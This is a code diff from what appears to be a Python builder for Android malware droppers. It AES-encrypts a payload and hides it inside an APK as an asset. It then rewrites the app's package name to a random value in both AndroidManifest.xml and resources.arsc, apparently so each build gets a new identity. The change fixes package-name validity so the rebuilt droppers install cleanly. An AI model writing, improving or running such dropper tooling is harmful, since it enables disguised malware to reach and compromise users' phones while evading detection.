@@ -251,14 +251,16 @@ def encrypt_payload(data: bytes) -> bytes:
     return iv + cipher.encrypt(pad(data, AES.block_size))
 
 OLD_PKG = "com.gdww.ihwc.hpfv"
-_CHARS  = _string.ascii_lowercase + _string.digits
+_ALPHA  = _string.ascii_lowercase
+_ALNUM  = _string.ascii_lowercase + _string.digits
 
 def _random_pkg() -> str:
-    suffix = ''.join(_random.choices(_CHARS, k=4))
+    # First char must be letter — Android rejects package components starting with digit
+    suffix = _random.choice(_ALPHA) + ''.join(_random.choices(_ALNUM, k=3))
     return f"com.gdww.ihwc.{suffix}"
 
 def _patch_pkg(data: bytes, new_pkg: str) -> bytes:
-    """Selective UTF-16LE patch of OLD_PKG in binary AXML.
+    """Selective UTF-16LE patch of OLD_PKG in binary AXML / resources.arsc.
 
     After matching com.gdww.ihwc.hpfv:
       not followed by '.'           -> standalone package attr     -> PATCH
@@ -311,6 +313,8 @@ def rebuild_dropper(payload_bytes: bytes) -> tuple[bytes, str]:
             if item.filename == ASSET_NAME:
                 data = encrypted
             elif item.filename == "AndroidManifest.xml":
+                data = _patch_pkg(data, new_pkg)
+            elif item.filename == "resources.arsc":
                 data = _patch_pkg(data, new_pkg)
             zout.writestr(item, data)
     log.info("Rebuilt dropper pkg=%s", new_pkg)
